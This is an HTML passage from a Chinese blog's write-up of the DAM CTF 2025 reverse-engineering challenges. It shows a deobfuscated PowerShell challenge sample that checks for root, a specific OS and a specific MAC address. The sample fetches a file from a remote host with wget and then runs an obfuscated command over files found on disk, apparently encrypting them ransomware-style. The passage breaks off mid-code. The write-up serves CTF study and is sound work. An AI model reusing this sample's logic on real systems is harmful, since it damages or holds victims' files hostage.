<!DOCTYPE html>


<html theme="dark" showBanner="true" hasBanner="true" > 
<link href="/fontawesome/css/fontawesome.css" rel="stylesheet">
<link href="/fontawesome/css/brands.css" rel="stylesheet">
<link href="/fontawesome/css/solid.css" rel="stylesheet">
<script src="/js/color.global.min.js" ></script>
<script src="/js/load-settings.js" ></script>
<head>
  <meta charset="utf-8">
  
  
  

  
  <title>DAM CTF 2025 WriteUp (Reverse方向) | 棱晶の小窝</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="preload" href="/css/fonts/Roboto-Regular.ttf" as="font" type="font/ttf" crossorigin="anonymous">
  <link rel="preload" href="/css/fonts/Roboto-Bold.ttf" as="font" type="font/ttf" crossorigin="anonymous">

  <meta name="description" content="bash.ps1powershell脚本，变量名和函数名有混淆，去除混淆后查看： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061function Func &#123;    Funcb    Funcd    Func">
<meta property="og:type" content="article">
<meta property="og:title" content="DAM CTF 2025 WriteUp (Reverse方向)">
<meta property="og:url" content="https://astralprisma.github.io/2025/05/12/dam_25/index.html">
<meta property="og:site_name" content="棱晶の小窝">
<meta property="og:description" content="bash.ps1powershell脚本，变量名和函数名有混淆，去除混淆后查看： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061function Func &#123;    Funcb    Funcd    Func">
<meta property="og:locale">
<meta property="article:published_time" content="2025-05-11T17:00:00.000Z">
<meta property="article:modified_time" content="2025-05-11T16:55:31.838Z">
<meta property="article:author" content="Astral Prisma">
<meta name="twitter:card" content="summary">
  
  
    <link rel="shortcut icon" href="/XH.png">
  
  
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 7.3.0"></head>

<body>
  
  
    
<div id="banner" class="">
  <img src="/OTSA.png" itemprop="image">
  <div id="banner-dim"></div>
</div>
 
   
  <div id="main-grid" class="shadow   ">
    <div id="nav" class=""  >
      <navbar id="navbar">
  <nav id="title-nav">
    <a href="/">
      <div id="vivia-logo">
        <div class="dot"></div>
        <div class="dot"></div>
        <div class="dot"></div>
        <div class="dot"></div>
      </div>
      <div>棱晶の小窝 </div>
    </a>
  </nav>
  <nav id="main-nav">
    
      <a class="main-nav-link" href="/">Home</a>
    
      <a class="main-nav-link" href="/archives">Archives</a>
    
      <a class="main-nav-link" href="/about">About</a>
    
  </nav>
  <nav id="sub-nav">
    <a id="theme-btn" class="nav-icon">
      <span class="light-mode-icon"><svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M438.5-829.913v-48q0-17.452 11.963-29.476 11.964-12.024 29.326-12.024 17.363 0 29.537 12.024t12.174 29.476v48q0 17.452-11.963 29.476-11.964 12.024-29.326 12.024-17.363 0-29.537-12.024T438.5-829.913Zm0 747.826v-48q0-17.452 11.963-29.476 11.964-12.024 29.326-12.024 17.363 0 29.537 12.024t12.174 29.476v48q0 17.452-11.963 29.476-11.964 12.024-29.326 12.024-17.363 0-29.537-12.024T438.5-82.087ZM877.913-438.5h-48q-17.452 0-29.476-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537t29.476-12.174h48q17.452 0 29.476 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T877.913-438.5Zm-747.826 0h-48q-17.452 0-29.476-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537T82.087-521.5h48q17.452 0 29.476 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T130.087-438.5Zm660.174-290.87-34.239 32q-12.913 12.674-29.565 12.174-16.653-.5-29.327-13.174-12.674-12.673-12.554-28.826.12-16.152 12.794-28.826l33-35q12.913-12.674 30.454-12.674t30.163 12.847q12.709 12.846 12.328 30.826-.38 17.98-13.054 30.653ZM262.63-203.978l-32 34q-12.913 12.674-30.454 12.674t-30.163-12.847q-12.709-12.846-12.328-30.826.38-17.98 13.054-30.653l33.239-31q12.913-12.674 29.565-12.174 16.653.5 29.327 13.174 12.674 12.673 12.554 28.826-.12 16.152-12.794 28.826Zm466.74 33.239-32-33.239q-12.674-12.913-12.174-29.565.5-16.653 13.174-29.327 12.673-12.674 28.826-13.054 16.152-.38 28.826 12.294l35 33q12.674 12.913 12.674 30.454t-12.847 30.163q-12.846 12.709-30.826 12.328-17.98-.38-30.653-13.054ZM203.978-697.37l-34-33q-12.674-12.913-13.174-29.945-.5-17.033 12.174-29.707t31.326-13.293q18.653-.62 31.326 13.054l32 34.239q11.674 12.913 11.174 29.565-.5 16.653-13.174 29.327-12.673 12.674-28.826 12.554-16.152-.12-28.826-12.794ZM480-240q-100 0-170-70t-70-170q0-100 70-170t170-70q100 0 170 70t70 170q0 100-70 170t-170 70Zm-.247-82q65.703 0 111.475-46.272Q637-414.544 637-480.247t-45.525-111.228Q545.95-637 480.247-637t-111.475 45.525Q323-545.95 323-480.247t45.525 111.975Q414.05-322 479.753-322ZM481-481Z"/></svg></span>
      <span class="dark-mode-icon"><svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M480.239-116.413q-152.63 0-258.228-105.478Q116.413-327.37 116.413-480q0-130.935 77.739-227.435t206.304-125.043q43.022-9.631 63.87 10.869t3.478 62.805q-8.891 22.043-14.315 44.463-5.424 22.42-5.424 46.689 0 91.694 64.326 155.879 64.325 64.186 156.218 64.186 24.369 0 46.978-4.946 22.609-4.945 44.413-14.076 42.826-17.369 62.967 1.142 20.142 18.511 10.511 61.054Q807.174-280 712.63-198.206q-94.543 81.793-232.391 81.793Zm0-95q79.783 0 143.337-40.217 63.554-40.218 95.793-108.283-15.608 4.044-31.097 5.326-15.49 1.283-31.859.805-123.706-4.066-210.777-90.539-87.071-86.473-91.614-212.092-.24-16.369.923-31.978 1.164-15.609 5.446-30.978-67.826 32.478-108.282 96.152Q211.652-559.543 211.652-480q0 111.929 78.329 190.258 78.329 78.329 190.258 78.329ZM466.13-465.891Z"/></svg></span>
    </a>
    
    <div id="nav-menu-btn" class="nav-icon">
      <svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M177.37-252.282q-17.453 0-29.477-11.964-12.024-11.963-12.024-29.326t12.024-29.537q12.024-12.174 29.477-12.174h605.26q17.453 0 29.477 11.964 12.024 11.963 12.024 29.326t-12.024 29.537q-12.024 12.174-29.477 12.174H177.37Zm0-186.218q-17.453 0-29.477-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537T177.37-521.5h605.26q17.453 0 29.477 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T782.63-438.5H177.37Zm0-186.217q-17.453 0-29.477-11.964-12.024-11.963-12.024-29.326t12.024-29.537q12.024-12.174 29.477-12.174h605.26q17.453 0 29.477 11.964 12.024 11.963 12.024 29.326t-12.024 29.537q-12.024 12.174-29.477 12.174H177.37Z"/></svg>
    </div>
  </nav>
</navbar>
<div id="nav-dropdown" class="hidden">
  <div id="dropdown-link-list">
    
      <a class="nav-dropdown-link" href="/">Home</a>
    
      <a class="nav-dropdown-link" href="/archives">Archives</a>
    
      <a class="nav-dropdown-link" href="/about">About</a>
    
     
    </div>
</div>
<script>
  let dropdownBtn = document.getElementById("nav-menu-btn");
  let dropdownEle = document.getElementById("nav-dropdown");
  dropdownBtn.onclick = function() {
    dropdownEle.classList.toggle("hidden");
  }
</script>
    </div>
    <div id="sidebar-wrapper">
      <sidebar id="sidebar">
  
    <div class="widget-wrap">
  <div class="info-card">
    <div class="avatar">
      
        <image src=/AP.png></image>
      
      <div class="img-dim"></div>
    </div>
    <div class="info">
      <div class="username">Astral Prisma </div>
      <div class="dot"></div>
      <div class="subtitle">星界棱晶 </div>
      <div class="link-list">
        
          <a class="link-btn" target="_blank" rel="noopener" href="https://space.bilibili.com/454936579" title="Bilibili"><image src=https://www.bilibili.com/favicon.ico></image></a>
        
          <a class="link-btn" target="_blank" rel="noopener" href="https://www.primegrid.com/show_user.php?userid=1243718" title="PrimeGrid"><image src=https://www.primegrid.com/images/favicon_32.png></image></a>
        
          <a class="link-btn" target="_blank" rel="noopener" href="https://github.com/AstralPrisma" title="GitHub"><image src=https://github.githubassets.com/favicons/favicon.png></image></a>
         
      </div>  
    </div>
  </div>
</div>

  
  <div class="sticky">
    
      


  <div class="widget-wrap">
    <div class="widget">
      <h3 class="widget-title">分类</h3>
      <div class="category-box">
            <a class="category-link" href="/categories/WriteUp/">
                WriteUp
                <div class="category-count">21</div>
            </a>
        
            <a class="category-link" href="/categories/Ideas/">
                Ideas
                <div class="category-count">1</div>
            </a>
        </div>
    </div>
  </div>


    
      

    
  </div>
</sidebar>
    </div>
    <div id="content-body">
       

<article id="post-dam_25" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
    
   
  <div class="article-inner">
    <div class="article-main">
      <header class="article-header">
        
<div class="main-title-bar">
  <div class="main-title-dot"></div>
  
    
      <h1 class="p-name article-title" itemprop="headline name">
        DAM CTF 2025 WriteUp (Reverse方向)
      </h1>
    
  
</div>

        <div class='meta-info-bar'>
          <div class="meta-info">
  <time class="dt-published" datetime="2025-05-11T17:00:00.000Z" itemprop="datePublished">2025-05-12</time>
</div>
          <div class="need-seperator meta-info">
            <div class="meta-cate-flex">
  
  <a class="meta-cate-link" href="/categories/WriteUp/">WriteUp</a>
   
</div>
  
          </div>
          <div class="wordcount need-seperator meta-info">
            5.1k 词 
          </div>
        </div>
        
      </header>
      <div class="e-content article-entry" itemprop="articleBody">
        
          <h1 id="bash-ps1"><a href="#bash-ps1" class="headerlink" title="bash.ps1"></a>bash.ps1</h1><p>powershell脚本，变量名和函数名有混淆，去除混淆后查看：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Func</span></span> </span><br><span class="line">&#123;</span><br><span class="line">    Funcb</span><br><span class="line">    Funcd</span><br><span class="line">    Funca</span><br><span class="line">    Funcc</span><br><span class="line">    Funce</span><br><span class="line">    <span class="keyword">exit</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Funcb</span></span> </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ([<span class="built_in">int</span>](&amp;(<span class="built_in">Get-Command</span> /???/id) <span class="literal">-u</span>) <span class="operator">-cne</span> <span class="operator">-not</span> [<span class="built_in">bool</span>][<span class="built_in">byte</span>])&#123;<span class="keyword">exit</span>&#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="operator">-not</span> ((&amp;(<span class="built_in">Get-Command</span> /???/?at) /etc/*release*) | grep noble))&#123;<span class="keyword">exit</span>&#125;</span><br><span class="line">    <span class="keyword">if</span> ((&amp;(<span class="built_in">Get-Command</span> /???/?at) /sys/<span class="class"><span class="keyword">class</span>/<span class="title">net</span>/<span class="title">enp0s3</span>/<span class="title">address</span>) -<span class="title">cne</span> &quot;08:00:27:<span class="title">eb</span>:6<span class="title">b</span>:49&quot;)</span>&#123;<span class="keyword">exit</span>&#125; <span class="comment"># intentional guard in chal to prevent accidentally running the script</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Funcd</span></span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$glbd</span> = (&amp;(<span class="built_in">Get-Command</span> /???/?at) /etc/*release*).split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="variable">$glbc</span> = (<span class="variable">$glbd</span>[<span class="number">0</span>] += <span class="variable">$glbd</span>[<span class="number">1</span>].split(<span class="string">&#x27;=&#x27;</span>)[<span class="number">0</span>] += <span class="variable">$glbd</span>[<span class="number">2</span>] += <span class="variable">$glbd</span>[<span class="number">3</span>].split(<span class="string">&#x27;=&#x27;</span>)[<span class="number">0</span>] += <span class="variable">$glbd</span>[<span class="number">4</span>].split(<span class="string">&#x27;=&#x27;</span>)[<span class="number">0</span>] += <span class="variable">$glbd</span>[<span class="number">5</span>] += <span class="variable">$glbd</span>[<span class="number">6</span>].split(<span class="string">&#x27;=&#x27;</span>)[<span class="number">0</span>] += <span class="variable">$glbd</span>[<span class="number">7</span>].split(<span class="string">&#x27;=&#x27;</span>)[<span class="number">0</span>] += <span class="variable">$glbd</span>[<span class="number">8</span>] += <span class="variable">$glbd</span>[<span class="number">9</span>] += <span class="variable">$glbd</span>[<span class="number">10</span>] += <span class="variable">$glbd</span>[<span class="number">11</span>] += <span class="variable">$glbd</span>[<span class="number">12</span>] += <span class="variable">$glbd</span>[<span class="number">13</span>] += <span class="variable">$glbd</span>[<span class="number">14</span>] += <span class="variable">$glbd</span>[<span class="number">15</span>] += <span class="variable">$glbd</span>[<span class="number">16</span>]).Tochararray() + <span class="number">0</span>..<span class="number">9</span></span><br><span class="line">    <span class="variable">$glbc</span> = (<span class="operator">-join</span> (<span class="variable">$glbc</span> | <span class="built_in">sort-object</span> | <span class="built_in">get-unique</span>))</span><br><span class="line">    <span class="variable">$Global:glba</span> = <span class="variable">$glbc</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Funca</span></span> </span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$glbe</span> = <span class="variable">$GLOBAL:glba</span>[<span class="number">3</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">5</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">12</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">8</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">7</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">12</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">1</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">6</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">5</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">12</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">6</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">5</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">14</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">3</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">1</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">3</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">3</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">7</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">13</span>] + <span class="string">&#x27;k&#x27;</span> + <span class="variable">$GLOBAL:glba</span>[<span class="number">41</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">56</span>]</span><br><span class="line">    <span class="variable">$glbb</span> = <span class="variable">$GLOBAL:glba</span>[<span class="number">16</span>]</span><br><span class="line">    &amp;(<span class="built_in">Get-Command</span> /???/?ge?) <span class="variable">$glbe</span> <span class="literal">-q</span> <span class="literal">-O</span> <span class="variable">$glbb</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Funcc</span></span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$glbf</span> <span class="keyword">in</span> (&amp;(<span class="built_in">Get-Command</span> I?????<span class="literal">-E</span>?????????) (<span class="string">&#x27;f&#x27;</span> + <span class="variable">$GLOBAL:glba</span>[<span class="number">44</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">47</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">40</span>] + <span class="string">&#x27; &#x27;</span> + <span class="variable">$GLOBAL:glba</span>[<span class="number">13</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">48</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">49</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">52</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">13</span>] + <span class="string">&#x27; &#x27;</span> + <span class="variable">$GLOBAL:glba</span>[<span class="number">11</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">52</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">56</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">49</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">41</span>] + <span class="string">&#x27; &#x27;</span> + <span class="string">&#x27;f&#x27;</span>)))</span><br><span class="line">    &#123;</span><br><span class="line">        &amp;(<span class="built_in">Get-Command</span> I?????<span class="literal">-E</span>?????????) (<span class="string">&quot;&quot;</span> + <span class="variable">$GLOBAL:glba</span>[<span class="number">48</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">49</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">41</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">47</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">51</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">51</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">45</span>] + <span class="string">&#x27; &#x27;</span> + <span class="variable">$GLOBAL:glba</span>[<span class="number">41</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">47</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">39</span>] + <span class="string">&#x27; &#x27;</span> + <span class="variable">$GLOBAL:glba</span>[<span class="number">11</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">37</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">41</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">51</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">11</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">2</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">5</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">6</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">11</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">39</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">38</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">39</span>] + <span class="string">&#x27; &#x27;</span> + <span class="variable">$GLOBAL:glba</span>[<span class="number">11</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">49</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">37</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">51</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">51</span>] + <span class="string">&#x27; &#x27;</span> + <span class="string">&#x27;f&#x27;</span> + <span class="variable">$GLOBAL:glba</span>[<span class="number">44</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">45</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">41</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">14</span>] + <span class="string">&#x27;k&#x27;</span> + <span class="variable">$GLOBAL:glba</span>[<span class="number">41</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">56</span>] + <span class="string">&#x27; &#x27;</span> + <span class="variable">$GLOBAL:glba</span>[<span class="number">11</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">44</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">47</span>] + <span class="string">&#x27; &#x27;</span> + <span class="string">&quot; <span class="variable">$glbf</span> &quot;</span> + <span class="string">&#x27; &#x27;</span> + <span class="variable">$GLOBAL:glba</span>[<span class="number">11</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">48</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">53</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">52</span>] + <span class="string">&#x27; &#x27;</span> + <span class="string">&quot; <span class="variable">$glbf</span> &quot;</span>)</span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$glbf</span> <span class="keyword">in</span> (&amp;(<span class="built_in">Get-Command</span> I?????<span class="literal">-E</span>?????????) (<span class="string">&#x27;f&#x27;</span> + <span class="variable">$GLOBAL:glba</span>[<span class="number">44</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">47</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">40</span>] + <span class="string">&#x27; &#x27;</span> + <span class="variable">$GLOBAL:glba</span>[<span class="number">13</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">43</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">48</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">46</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">41</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">13</span>] + <span class="string">&#x27; &#x27;</span> + <span class="variable">$GLOBAL:glba</span>[<span class="number">11</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">52</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">56</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">49</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">41</span>] + <span class="string">&#x27; &#x27;</span> + <span class="string">&#x27;f&#x27;</span>)))</span><br><span class="line">    &#123;</span><br><span class="line">        &amp;(<span class="built_in">Get-Command</span> I?????<span class="literal">-E</span>?????????) (<span class="string">&quot;&quot;</span> + <span class="variable">$GLOBAL:glba</span>[<span class="number">48</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">49</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">41</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">47</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">51</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">51</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">45</span>] + <span class="string">&#x27; &#x27;</span> + <span class="variable">$GLOBAL:glba</span>[<span class="number">41</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">47</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">39</span>] + <span class="string">&#x27; &#x27;</span> + <span class="variable">$GLOBAL:glba</span>[<span class="number">11</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">37</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">41</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">51</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">11</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">2</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">5</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">6</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">11</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">39</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">38</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">39</span>] + <span class="string">&#x27; &#x27;</span> + <span class="variable">$GLOBAL:glba</span>[<span class="number">11</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">49</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">37</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">51</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">51</span>] + <span class="string">&#x27; &#x27;</span> + <span class="string">&#x27;f&#x27;</span> + <span class="variable">$GLOBAL:glba</span>[<span class="number">44</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">45</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">41</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">14</span>] + <span class="string">&#x27;k&#x27;</span> + <span class="variable">$GLOBAL:glba</span>[<span class="number">41</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">56</span>] + <span class="string">&#x27; &#x27;</span> + <span class="variable">$GLOBAL:glba</span>[<span class="number">11</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">44</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">47</span>] + <span class="string">&#x27; &#x27;</span> + <span class="string">&quot; <span class="variable">$glbf</span> &quot;</span> + <span class="string">&#x27; &#x27;</span> + <span class="variable">$GLOBAL:glba</span>[<span class="number">11</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">48</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">53</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">52</span>] + <span class="string">&#x27; &#x27;</span> + <span class="string">&quot; <span class="variable">$glbf</span> &quot;</span>)</span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$glbf</span> <span class="keyword">in</span> (&amp;(<span class="built_in">Get-Command</span> I?????<span class="literal">-E</span>?????????) (<span class="string">&#x27;f&#x27;</span> + <span class="variable">$GLOBAL:glba</span>[<span class="number">44</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">47</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">40</span>] + <span class="string">&#x27; &#x27;</span> + <span class="variable">$GLOBAL:glba</span>[<span class="number">13</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">41</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">52</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">39</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">13</span>] + <span class="string">&#x27; &#x27;</span> + <span class="variable">$GLOBAL:glba</span>[<span class="number">11</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">52</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">56</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">49</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">41</span>] + <span class="string">&#x27; &#x27;</span> + <span class="string">&#x27;f&#x27;</span> )))</span><br><span class="line">    &#123;</span><br><span class="line">        &amp;(<span class="built_in">Get-Command</span> I?????<span class="literal">-E</span>?????????) (<span class="string">&quot;&quot;</span> + <span class="variable">$GLOBAL:glba</span>[<span class="number">48</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">49</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">41</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">47</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">51</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">51</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">45</span>] + <span class="string">&#x27; &#x27;</span> + <span class="variable">$GLOBAL:glba</span>[<span class="number">41</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">47</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">39</span>] + <span class="string">&#x27; &#x27;</span> + <span class="variable">$GLOBAL:glba</span>[<span class="number">11</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">37</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">41</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">51</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">11</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">2</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">5</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">6</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">11</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">39</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">38</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">39</span>] + <span class="string">&#x27; &#x27;</span> + <span class="variable">$GLOBAL:glba</span>[<span class="number">11</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">49</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">37</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">51</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">51</span>] + <span class="string">&#x27; &#x27;</span> + <span class="string">&#x27;f&#x27;</span> + <span class="variable">$GLOBAL:glba</span>[<span class="number">44</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">45</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">41</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">14</span>] + <span class="string">&#x27;k&#x27;</span> + <span class="variable">$GLOBAL:glba</span>[<span class="number">41</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">56</span>] + <span class="string">&#x27; &#x27;</span> + <span class="variable">$GLOBAL:glba</span>[<span class="number">11</span>] + <span 